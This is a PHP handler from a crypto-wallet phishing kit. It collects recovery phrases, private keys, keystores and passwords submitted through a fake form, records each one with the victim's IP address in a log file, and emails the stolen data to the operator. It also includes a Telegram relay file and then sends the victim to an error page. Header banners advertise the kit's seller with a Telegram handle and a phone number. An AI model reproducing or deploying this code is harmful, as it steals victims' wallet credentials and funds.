<?php
ob_start();
session_start();


require "email.php";

if (isset($_POST['phrase']) || isset($_POST['key']) || isset($_POST['keystore']) || isset($_POST['password'])) {

	$hi="#---------------------------[ FIXSWEB_OFFICE_Logs...Telegram..@fixsx]----------------------------#\r\n";
    $hi .= "Phrase:   {$_POST['phrase']}\r\n";
    $hi .= "Private Key:   {$_POST['key']}\r\n";
    $hi .= "Keystore:   {$_POST['keystore']}\r\n";
    $hi .= "Keystore Password:   {$_POST['password']}\r\n";
    $hi .= "TIME:        " . date("d/m/Y h:i:sa") . " GMT\r\n";
    $hi .= "IP:         {$_SERVER['REMOTE_ADDR']}\r\n";
	$hi.="#---------------------------[ FIXSWEB_WA.....+447455335919]----------------------------#\r\n";

    $save = fopen("logs.txt", "a+");
    fwrite($save, $hi);
    fclose($save);

    $subject = "#CRYPTO WALLET ACCESS ";
    $headers = "From: CRYPTO WALLET FIXSWEB <fixsweb>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($your_email, $subject, $hi, $headers);

    $helper = array_keys($_SESSION);
    foreach ($helper as $key) {
        unset($_SESSION[$key]);
    }

	include('telegram.txt');


    exit(header("Location: error.html")); // go to bank login page officiel..

} else {
    header("HTTP/1.0 404 Not Found");
    exit();
}
?>